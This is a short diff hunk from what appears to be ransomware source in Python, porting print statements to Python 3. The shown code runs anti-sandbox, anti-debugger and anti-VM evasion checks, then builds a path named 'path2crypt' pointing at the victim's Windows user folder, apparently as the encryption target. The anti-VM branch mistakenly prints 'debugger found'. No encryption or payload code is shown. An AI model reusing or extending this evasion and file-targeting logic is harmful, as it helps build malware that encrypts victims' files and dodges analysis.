@@ -46,15 +46,15 @@ def main():
     if anti_sandbox.check(0,0,1,0,1,1) == True:
         pass
     else:
-        print 'sandbox found'
+        print ("sandbox found")
     if anti_debugger.check() == True:
         pass
     else:
-        print 'debugger found'
+        print ("debugger found")
     if anti_vm.check() == True:
         pass
     else:
-        print 'debugger found'
+        print ("debugger found")
     
     username = os.getenv('username')
     path2crypt = 'C:\\Users\\' + username
